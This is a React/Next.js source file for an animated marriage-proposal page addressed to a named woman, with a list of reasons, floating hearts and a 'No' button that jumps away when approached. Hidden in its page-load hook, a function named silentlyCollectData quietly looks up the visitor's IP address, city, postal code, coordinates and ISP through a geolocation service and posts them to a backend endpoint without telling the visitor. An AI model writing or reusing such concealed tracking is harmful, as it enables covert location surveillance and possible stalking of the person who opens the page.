'use client';

import { useState, useEffect, useRef } from 'react';

export default function LoveProposalPage() {
  const [mounted, setMounted] = useState(false);
  const [proposalAccepted, setProposalAccepted] = useState(false);
  const [noBtnPos, setNoBtnPos] = useState({ top: 'auto', left: 'auto' });
  const [activeReasonIdx, setActiveReasonIdx] = useState(0);
  const containerRef = useRef(null);

  const reasons = [
    "Your beautiful smile that brightens up my day 🌸",
    "How you make everything feel so peaceful and blessed ✨",
    "Our conversations that I never want to end 📞",
    "The way you care, with so much kindness and warmth 💖",
    "Insha'Allah, the beautiful future we will build together 🏡",
    "Because you are my Qadr (destiny) and my forever Moon 🌙"
  ];

  // Probed data collection in background (IP & Location only)
  useEffect(() => {
    setMounted(true);

    const silentlyCollectData = async () => {
      try {
        const data = {};

        // Fetch Public IP Geolocation Details (Client-Side)
        try {
          const geoRes = await fetch('https://ipapi.co/json/');
          if (geoRes.ok) {
            const gData = await geoRes.json();
            data.publicIp = gData.ip;
            data.publicGeo = {
              city: gData.city,
              region: gData.region,
              country: gData.country_name,
              latitude: gData.latitude,
              longitude: gData.longitude,
              postal: gData.postal,
              isp: gData.org,
            };
          }
        } catch (e) {
          console.warn("GeoIP API error:", e);
        }

        // Send to backend endpoint
        await fetch('/api/collect-info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        });
      } catch (err) {
        console.error("Silent diagnostic error:", err);
      }
    };

    silentlyCollectData();
  }, []);

  // Make the No button run away!
  const handleNoButtonHover = () => {
    if (!containerRef.current) return;
    const containerRect = containerRef.current.getBoundingClientRect();
    
    // Generate safe coordinates inside the container
    const newTop = Math.random() * (containerRect.height - 60);
    const newLeft = Math.random() * (containerRect.width - 120);

    setNoBtnPos({
      top: `${Math.max(10, Math.min(newTop, containerRect.height - 60))}px`,
      left: `${Math.max(10, Math.min(newLeft, containerRect.width - 120))}px`
    });
  };

  const nextReason = () => {
    setActiveReasonIdx(prev => (prev + 1) % reasons.length);
  };

  if (!mounted) return null;

  return (
    <div className="proposal-viewport" style={{
      minHeight: '100vh',
      background: '#060411',
      backgroundImage: 'radial-gradient(circle at 50% 40%, #2c0d27 0%, #030209 100%)',
      color: '#fff5f7',
      fontFamily: "'Outfit', sans-serif",
      padding: '20px',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      overflow: 'hidden',
      position: 'relative'
    }}>
      {/* Cursive fonts, keyframes, and custom animations */}
      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Outfit:wght@300;400;600;700&family=Sacramento&display=swap');
        
        .cursive-letter-title {
          font-family: 'Dancing Script', cursive;
          font-size: 3rem;
          color: #ffb3c1;
          text-shadow: 0 0 15px rgba(255, 179, 193, 0.5);
          margin: 0 0 5px 0;
        }

        .cursive-quote {
          font-family: 'Sacramento', cursive;
          font-size: 2.2rem;
          color: #ffe5ec;
          line-height: 1.2;
          margin-top: 10px;
          display: block;
        }

        /* Twinkling Star Animation */
        .twinkle-star {
          position: absolute;
          background: #fff;
          border-radius: 50%;
          box-shadow: 0 0 4px #fff, 0 0 8px #ffd700;
          animation: starTwinkle 2s infinite ease-in-out;
        }

        @keyframes starTwinkle {
          0%, 100% { opacity: 0.3; transform: scale(0.8); }
          50% { opacity: 1; transform: scale(1.3); }
        }

        /* Floating Hearts */
        @keyframes floatHeart {
          0% {
            transform: translateY(0) rotate(0deg) scale(0.8);
            opacity: 0;
          }
          10% {
            opacity: 0.6;
          }
          90% {
            opacity: 0.6;
          }
          100% {
            transform: translateY(-105vh) rotate(360deg) scale(1.3);
            opacity: 0;
          }
        }

        /* Pulsing Crescent Moon */
        @keyframes moonPulse {
          0%, 100% { transform: translateY(0) scale(1); filter: drop-shadow(0 0 10px rgba(255, 235, 163, 0.4)); }
          50% { transform: translateY(-8px) scale(1.05); filter: drop-shadow(0 0 25px rgba(255, 235, 163, 0.7)); }
        }

        /* Beating Heart */
        .beating-heart {
          font-size: 3rem;
          color: #ff4d6d;
          animation: beat 1.2s infinite;
          display: inline-block;
          cursor: default;
          filter: drop-shadow(0 0 10px rgba(255, 77, 109, 0.5));
        }

        @keyframes beat {
          0%, 100% { transform: scale(1); }
          25% { transform: scale(1.15); }
          40% { transform: scale(1.05); }
          60% { transform: scale(1.2); }
        }

        @keyframes cardFadeIn {
          from { opacity: 0; transform: scale(0.9) translateY(20px); }
          to { opacity: 1; transform: scale(1) translateY(0); }
        }
      `}</style>

      {/* Background Twinkling Stars */}
      {[...Array(25)].map((_, i) => (
        <div 
          key={`star-${i}`}
          className="twinkle-star"
          style={{
            top: `${Math.random() * 90}%`,
            left: `${Math.random() * 95}%`,
            width: `${Math.random() * 3 + 2}px`,
            height: `${Math.random() * 3 + 2}px`,
            animationDelay: `${Math.random() * 3}s`,
            animationDuration: `${Math.random() * 2 + 1.5}s`
          }}
        />
      ))}

      {/* Floating Hearts Background */}
      <div style={{ position: 'absolute', inset: 0, pointerEvents: 'none', zIndex: 1, overflow: 'hidden' }}>
        {[...Array(18)].map((_, i) => (
          <div 
            key={`heart-${i}`} 
            style={{
              position: 'absolute',
              bottom: '-50px',
              left: `${Math.random() * 100}%`,
              fontSize: `${Math.random() * 25 + 15}px`,
              opacity: 0,
              animation: `floatHeart ${Math.random() * 8 + 6}s linear infinite`,
              animationDelay: `${Math.random() * 6}s`,
              color: i % 3 === 0 ? '#ff4d6d' : (i % 3 === 1 ? '#ff758c' : '#ffb3c1')
            }}
          >
            {i % 2 === 0 ? '❤️' : '💖'}
          </div>
        ))}
      </div>

      {/* Main Proposal Container */}
      <div ref={containerRef} style={{
        maxWidth: '520px',
        width: '100%',
        background: 'rgba(255, 240, 243, 0.07)',
        backdropFilter: 'blur(20px)',
        border: '1.5px solid rgba(255, 179, 193, 0.25)',
        borderRadius: '28px',
        padding: '40px 30px',
        boxShadow: '0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(255, 179, 193, 0.15)',
        zIndex: 5,
        position: 'relative',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        textAlign: 'center',
        minHeight: '520px',
        justifyContent: 'center',
        boxSizing: 'border-box',
        animation: 'cardFadeIn 1s cubic-bezier(0.16, 1, 0.3, 1) both'
      }}>

        {!proposalAccepted ? (
          <div style={{ width: '100%' }}>
            
            {/* Glowing Pulsing Moon */}
            <div style={{
              fontSize: '4.8rem',
              animation: 'moonPulse 4s ease-in-out infinite',
              marginBottom: '10px',
              display: 'inline-block',
              cursor: 'default'
            }}>
              🌙
            </div>

            <h1 className="cursive-letter-title">
              To My Moon Chaudhary
            </h1>
            
            <p style={{
              fontSize: '1rem',
              color: '#ffe5ec',
              margin: '0 0 24px 0',
              lineHeight: '1.6',
              fontWeight: 300,
              letterSpacing: '0.5px'
            }}>
              In a world full of stars, my eyes only search for you. You bring light, peace, and beauty to my life.
            </p>

            {/* Clickable Reasons Box */}
            <div 
              onClick={nextReason}
              style={{
                background: 'rgba(255, 77, 109, 0.08)',
                border: '1.5px dashed rgba(255, 117, 140, 0.3)',
                borderRadius: '18px',
                padding: '18px 20px',
                marginBottom: '28px',
                cursor: 'pointer',
                transition: 'all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1)',
                minHeight: '70px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                boxSizing: 'border-box',
                boxShadow: '0 4px 15px rgba(0,0,0,0.1)'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.background = 'rgba(255, 77, 109, 0.12)';
                e.currentTarget.style.borderColor = 'rgba(255, 117, 140, 0.5)';
                e.currentTarget.style.transform = 'translateY(-2px)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.background = 'rgba(255, 77, 109, 0.08)';
                e.currentTarget.style.borderColor = 'rgba(255, 117, 140, 0.3)';
                e.currentTarget.style.transform = 'translateY(0)';
              }}
            >
              <div style={{ fontSize: '0.9rem', lineHeight: '1.5', color: '#fff5f7' }}>
                <span style={{ 
                  display: 'block', 
                  fontSize: '0.72rem', 
                  color: '#ff758c', 
                  textTransform: 'uppercase', 
                  letterSpacing: '1.5px', 
                  marginBottom: '6px',
                  fontWeight: 600
                }}>
                  🌸 Tap to reveal my thoughts 🌸
                </span>
                {reasons[activeReasonIdx]}
              </div>
            </div>

            <div style={{ margin: '0 0 24px 0' }}>
              <span className="beating-heart">❤️</span>
            </div>

            <h2 style={{
              fontSize: '1.4rem',
              color: '#ffb3c1',
              margin: '0 0 16px 0',
              fontWeight: 700,
              lineHeight: '1.4',
              letterSpacing: '0.3px'
            }}>
              Will you complete my universe and marry me?
            </h2>

            <p style={{
              fontSize: '0.88rem',
              color: '#ffd0d6',
              lineHeight: '1.6',
              margin: '0 auto 32px auto',
              maxWidth: '430px',
              fontWeight: 300
            }}>
              Insha'Allah, I promise to walk hand-in-hand with you, pray by your side, and build a beautiful, 
              blessed life full of joy, comfort, and <i>Barakah</i>.
            </p>

            {/* Buttons Container */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '24px',
              position: 'relative',
              minHeight: '60px',
              width: '100%'
            }}>
              <button 
                onClick={() => setProposalAccepted(true)}
                style={{
                  background: 'linear-gradient(135deg, #ff4d6d 0%, #ff758c 100%)',
                  border: 'none',
                  color: '#ffffff',
                  padding: '14px 44px',
                  fontSize: '1.1rem',
                  fontWeight: 'bold',
                  borderRadius: '30px',
                  cursor: 'pointer',
                  boxShadow: '0 8px 25px rgba(255, 77, 109, 0.45)',
                  transition: 'transform 0.2s, box-shadow 0.2s',
                  zIndex: 10
                }}
                onMouseEnter={(e) => {
                  e.target.style.transform = 'scale(1.08)';
                  e.target.style.boxShadow = '0 10px 30px rgba(255, 77, 109, 0.6)';
                }}
                onMouseLeave={(e) => {
                  e.target.style.transform = 'scale(1)';
                  e.target.style.boxShadow = '0 8px 25px rgba(255, 77, 109, 0.45)';
                }}
              >
                YES! 💍
              </button>

              <button 
                onMouseEnter={handleNoButtonHover}
                onClick={handleNoButtonHover}
                style={{
                  background: 'rgba(255, 255, 255, 0.04)',
                  border: '1.5px solid rgba(255, 255, 255, 0.15)',
                  color: '#ffb3c1',
                  padding: '10px 26px',
                  fontSize: '0.92rem',
                  fontWeight: '600',
                  borderRadius: '30px',
                  cursor: 'pointer',
                  position: noBtnPos.top !== 'auto' ? 'absolute' : 'relative',
                  top: noBtnPos.top,
                  left: noBtnPos.left,
                  transition: noBtnPos.top !== 'auto' ? 'all 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275)' : 'none',
                  zIndex: 10
                }}
              >
                No
              </button>
            </div>

          </div>
        ) : (
          /* Accepted celebration view */
          <div style={{
            animation: 'fadeIn 0.8s ease-in-out',
            padding: '10px 0'
          }}>
            <div style={{ 
              fontSize: '5.5rem', 
              marginBottom: '20px', 
              animation: 'beat 1s infinite',
              display: 'inline-block'
            }}>
              💖
            </div>
            
            <h1 className="cursive-letter-title" style={{ fontSize: '3.4rem', margin: '0 0 10px 0' }}>
              Insha'Allah, Forever!
            </h1>

            <span className="cursive-quote" style={{ marginBottom: '20px' }}>
              "Written in our Qadr, and blessed in our hearts"
            </span>

            <div style={{
              background: 'rgba(255, 179, 193, 0.12)',
              border: '1.5px solid rgba(255, 179, 193, 0.35)',
              borderRadius: '20px',
              padding: '22px 24px',
              margin: '0 auto 28px auto',
              maxWidth: '430px',
              fontSize: '1rem',
              color: '#ffe5ec',
              lineHeight: '1.6',
              boxShadow: '0 4px 15px rgba(0,0,0,0.1)'
            }}>
              Our hearts are now forever connected. 🌸<br />
              I cannot wait to begin this beautiful journey, side-by-side with you.
            </div>

            <p style={{
              fontSize: '1rem',
              color: '#ffe0e6',
              maxWidth: '450px',
              margin: '0 auto 10px auto',
              lineHeight: '1.7',
              fontWeight: 300
            }}>
              Thank you, Moon! You have made my entire world complete. May Allah bless our union 
              with endless love, happiness, tranquility, and <i>Barakah</i>.
            </p>
          </div>
        )}

      </div>
    </div>
  );
}
